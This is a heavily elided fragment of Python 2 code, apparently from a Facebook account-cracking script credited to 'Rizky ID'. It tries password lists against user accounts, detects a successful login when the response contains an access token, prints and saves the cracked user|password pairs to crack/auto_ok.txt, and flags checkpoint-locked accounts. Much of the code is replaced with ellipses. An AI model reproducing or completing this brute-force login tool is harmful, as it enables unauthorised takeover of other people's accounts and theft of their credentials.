...
def login():
    ...
    try:
        ...
        print merah + '||    || ' + tutup + u'  \x1b[7m Author: Rizky ID \x1b[0m'
    ...
    try:
        ...
        for x in password:
            ...
            if 'access_token' in get:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + ' | ' + x
                auto_ok.append(user)
                s = open('crack/auto_ok.txt', 'a')
                s.write(user + '|' + x + '\n')
                break
                continue
            if 'www.facebook.com' in get['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + user + ' | ' + x
                auto_cp.append(user)
        ...
        print tutup + '\r[' + blue + '*' + tutup + '] ' + str(len(auto_run)) + lime + '/' + tutup + str(len(auto_total)) + ' = ',
        sys.stdout.flush()
    except:
        pass
